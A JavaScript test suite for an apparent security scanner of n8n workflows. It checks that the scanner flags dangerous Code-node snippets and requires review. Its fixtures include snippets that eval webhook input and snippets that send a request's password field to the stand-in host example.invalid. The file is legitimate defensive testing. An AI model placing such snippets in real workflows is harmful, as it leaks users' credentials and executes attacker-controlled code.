import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { createHash } from "node:crypto";
import test from "node:test";
import { assessBytes } from "../dist/assessment-engine.js";
import {
  buildServiceReport,
  serviceReportSchema,
} from "../dist/service-report.js";
import { presentInspection, inspectionSchema } from "../dist/inspection.js";

const node = (name, type, parameters = {}, typeVersion = 1) => ({
  id: name,
  name,
  type: `n8n-nodes-base.${type}`,
  typeVersion,
  parameters,
});
const chain = (...nodes) => ({
  nodes,
  connections: Object.fromEntries(
    nodes
      .slice(0, -1)
      .map((n, i) => [
        n.name,
        { main: [[{ node: nodes[i + 1].name, type: "main", index: 0 }]] },
      ]),
  ),
});
const mockTools = async () => ({
  gitleaks: {
    tool: "gitleaks",
    version: "8.30.1",
    status: "completed",
    findings: [],
  },
  native: {
    tool: "native_inspection",
    version: "1.0.0",
    modes: ["nlp", "python"].map((mode) => ({
      mode,
      status: "completed",
      findings: [],
      diagnostics:
        mode === "nlp"
          ? [{ fieldIndex: null, code: "nlp_english_model_profile" }]
          : [],
      versions: {
        python: "3.12.10",
        presidio: mode === "nlp" ? "2.2.366" : null,
        spacy: mode === "nlp" ? "3.8.18" : null,
        model: mode === "nlp" ? "en_core_web_sm@3.8.0" : null,
      },
    })),
  },
});
const assess = (workflow) =>
  assessBytes(Buffer.from(JSON.stringify(workflow)), {
    collectTools: mockTools,
    now: "2026-11-23T00:00:00.000Z",
  });
const rules = (report) =>
  report.files.flatMap((f) => [...f.base.rules, ...f.extensionRules]);
const codes = (report) =>
  rules(report).flatMap((r) =>
    r.findings.flatMap((f) => f.evidence.map((e) => e.code)),
  );
const diagnostics = (report) =>
  rules(report).flatMap((r) => r.diagnostics.map((d) => d.code));
const terminal = (source) =>
  chain(
    node("Input", "webhook", {}, 2.1),
    node("Code", "code", { jsCode: source }, 2),
  );

test("runtime precautions and PII model scope do not make the service analysis incomplete", async () => {
  const report = await assess(chain(node("Start", "manualTrigger")));
  const snapshot = JSON.stringify(report);
  const service = buildServiceReport(report);
  assert.equal(service.serviceReportVersion, "1.1.0");
  assert.equal(report.status, "partial");
  assert.equal(service.assessmentStatus, "partial");
  assert.equal(service.analysisStatus, "complete");
  assert.equal(service.staticCoverageStatus, "within_supported_profile");
  assert.equal(service.serviceScope.environmentInput, "not_requested");
  assert.equal(
    service.serviceScope.piiScope,
    "existing_detectors_context_completeness_excluded",
  );
  assert.ok(service.serviceScope.usageNoticeCount > 0);
  assert.ok(service.serviceScope.excludedScopeNoticeCount > 0);
  assert.equal(service.serviceScope.securityReviewRequired, false);
  assert.equal(service.decision, report.decision);
  assert.equal(service.publication, "requires_service_authorization");
  assert.equal(JSON.stringify(report), snapshot);
  const inspection = await presentInspection(report);
  assert.equal(inspection.inspectionVersion, "1.1.0");
  assert.ok(inspectionSchema.safeParse(inspection).success);
});

test("terminal global and helper calls expose execution or network candidates", async () => {
  for (const [source, expected] of [
    [
      "globalThis.eval($json.body.code); return [{json:{ok:true}}];",
      "javascript_external_evaluation_input",
    ],
    [
      'globalThis["Function"]($json.body.code); return [{json:{ok:true}}];',
      "javascript_external_evaluation_input",
    ],
    [
      "const evaluate = globalThis.eval; evaluate($json.body.code); return [{json:{ok:true}}];",
      "javascript_external_evaluation_input",
    ],
    [
      'await this.helpers.httpRequest({method:"POST",url:"https://example.invalid/receive",body:$json.body.password}); return [{json:{ok:true}}];',
      "javascript_dynamic_network_input",
    ],
    [
      'globalThis.fetch("https://example.invalid/receive", {body:$json.body.password}); return [{json:{ok:true}}];',
      "javascript_dynamic_network_input",
    ],
    [
      "const {eval:e}=globalThis; e($json.body.code); return [];",
      "javascript_external_evaluation_input",
    ],
    [
      'const {["Function"]:f}=globalThis; f($json.body.code); return [];',
      "javascript_external_evaluation_input",
    ],
    [
      "const {fetch:f}=globalThis; f($json.body.url); return [];",
      "javascript_dynamic_network_input",
    ],
    [
      "const {helpers}=this; helpers.httpRequest({url:$json.body.url}); return [];",
      "javascript_dynamic_network_input",
    ],
    [
      "const {httpRequest:r}=this.helpers; r({url:$json.body.url}); return [];",
      "javascript_dynamic_network_input",
    ],
  ]) {
    const report = await assess(terminal(source));
    assert.ok(codes(report).includes(expected), expected);
    const service = buildServiceReport(report);
    assert.ok(service.serviceScope.highRiskFindingCount > 0);
    assert.equal(service.serviceScope.securityReviewRequired, true);
    assert.equal(service.analysisStatus, "review_required");
    assert.ok(
      diagnostics(report).some((code) =>
        [
          "code_call_effect_unresolved",
          "code_effects_partially_analyzed",
          "code_identifier_unresolved",
        ].includes(code),
      ),
    );
  }
});

test("computed console output keeps secrets and PII candidates while unknown terminal effects remain gaps", async () => {
  const report = await assess(
    terminal(
      'console["log"]($json.body.password, $json.body.email); return [{json:{ok:true}}];',
    ),
  );
  assert.ok(codes(report).includes("console_output_call_candidate"));
  assert.ok(codes(report).includes("secret_candidate_transferred"));
  assert.ok(codes(report).includes("personal_data_candidate_transferred"));
  for (const source of [
    "runtime.send($json.body.password); return [{json:{ok:true}}];",
    "console[$json.body.method]($json.body.password); return [{json:{ok:true}}];",
    "const out = console.log; out($json.body.password); return [{json:{ok:true}}];",
    'const p = $json.body.password; console["log"](p); return [];',
    "(function(){}).constructor($json.body.code)(); return [{json:{ok:true}}];",
  ]) {
    const result = await assess(terminal(source));
    const service = buildServiceReport(result);
    assert.ok(
      service.analysisGaps.some((card) => /code_|unsafe_field/.test(card.code)),
    );
    assert.equal(service.analysisStatus, "review_required");
    assert.equal(service.serviceScope.securityReviewRequired, true);
  }
});

test("global shadowing does not invent an evaluation capability and parse failures cannot become scope notes", async () => {
  const shadowed = await assess(
    terminal(
      "const globalThis={eval: value => value}; globalThis.eval($json.body.label); return [{json:{ok:true}}];",
    ),
  );
  assert.ok(!codes(shadowed).includes("javascript_external_evaluation_input"));
  const destructured = await assess(
    terminal(
      "const globalThis={eval: value => value}; const {eval:e}=globalThis; e($json.body.label); return [];",
    ),
  );
  assert.ok(
    !codes(destructured).includes("javascript_external_evaluation_input"),
  );
  const dynamic = await assess(
    terminal(
      "const {[$json.body.method]:e}=globalThis; e($json.body.code); return [];",
    ),
  );
  assert.ok(!codes(dynamic).includes("javascript_external_evaluation_input"));
  assert.equal(buildServiceReport(dynamic).analysisStatus, "review_required");
  const invalid = await assess(terminal("return { broken syntax;"));
  const service = buildServiceReport(invalid);
  assert.equal(service.analysisStatus, "review_required");
  assert.ok(service.counts.analysisGaps > 0);
  assert.ok(
    diagnostics(invalid).some((code) => code.includes("parse_unavailable")),
  );
  const tampered = {
    ...service,
    analysisStatus: "complete",
    serviceScope: { ...service.serviceScope, securityReviewRequired: false },
  };
  assert.equal(serviceReportSchema.safeParse(tampered).success, false);
});

test("missing policy is a usage precaution but does not remove transfer evidence or a dynamic destination gap", async () => {
  const report = await assess(
    chain(
      node("Input", "webhook", {}, 2.1),
      node(
        "Send",
        "gmail",
        {
          sendTo: "={{ $json.body.recipient }}",
          message: "={{ $json.body.password }}",
        },
        2.2,
      ),
    ),
  );
  assert.ok(diagnostics(report).includes("transfer_policy_not_configured"));
  assert.ok(codes(report).includes("secret_candidate_transferred"));
  const service = buildServiceReport(report);
  assert.ok(
    service.environmentChecks.some(
      (card) => card.code === "transfer_policy_not_configured",
    ),
  );
  assert.ok(service.analysisGaps.length > 0);
  assert.equal(service.serviceScope.securityReviewRequired, true);
});

test("frozen 0.8 reports still reproduce the historical 1.0 presentation", async () => {
  const receipt = JSON.parse(
    await readFile(
      new URL(
        "../validation/assessment-runtime-0.8.0-results.json",
        import.meta.url,
      ),
      "utf8",
    ),
  );
  const entries = Object.values(receipt.reports);
  const entry = entries.find(
    (item) =>
      item?.report?.engineVersion === "0.8.0" ||
      item?.engineVersion === "0.8.0",
  );
  assert.ok(entry, "Frozen runtime receipt must include a report");
  const report = entry.report ?? entry;
  const inspection = await presentInspection(report);
  assert.equal(inspection.inspectionVersion, "1.0.0");
  assert.equal(inspection.serviceReport.serviceScope, undefined);
  assert.equal(
    inspection.serviceReport.analysisStatus,
    report.status === "analyzed" ? "complete" : "review_required",
  );
  assert.ok(inspectionSchema.safeParse(inspection).success);
});

test("explicit policy blocking or review remains required even without high findings or analysis gaps", async () => {
  for (const decision of ["block", "review"]) {
    const bytes = Buffer.from(
      JSON.stringify(
        chain(node("Input", "webhook", { authentication: "none" }, 2.1)),
      ),
    );
    const report = await assessBytes(bytes, {
      collectTools: mockTools,
      now: "2026-11-23T00:00:00.000Z",
      evidenceBytes: Buffer.from(
        JSON.stringify({
          schemaVersion: "1.0.0",
          inputSha256: createHash("sha256").update(bytes).digest("hex"),
          sources: [
            {
              id: "synthetic-policy",
              kind: "declaration",
              method: "user_declaration",
              recordedAt: "2026-11-23T00:00:00.000Z",
            },
          ],
          policy: {
            id: "policy",
            version: "1.0.0",
            sourceId: "synthetic-policy",
            purpose: "Synthetic review boundary",
            defaultDecision: decision,
            unknownDecision: decision,
            requireAuthenticatedWebhook: decision === "block",
          },
        }),
      ),
    });
    assert.notEqual(report.status, "error");
    const service = buildServiceReport(report);
    assert.equal(service.decision, decision);
    assert.equal(service.analysisStatus, "complete");
    assert.equal(service.serviceScope.highRiskFindingCount, 0);
    assert.equal(service.serviceScope.securityReviewRequired, true);
    assert.equal(
      serviceReportSchema.safeParse({
        ...service,
        serviceScope: {
          ...service.serviceScope,
          securityReviewRequired: false,
        },
      }).success,
      false,
    );
  }
});
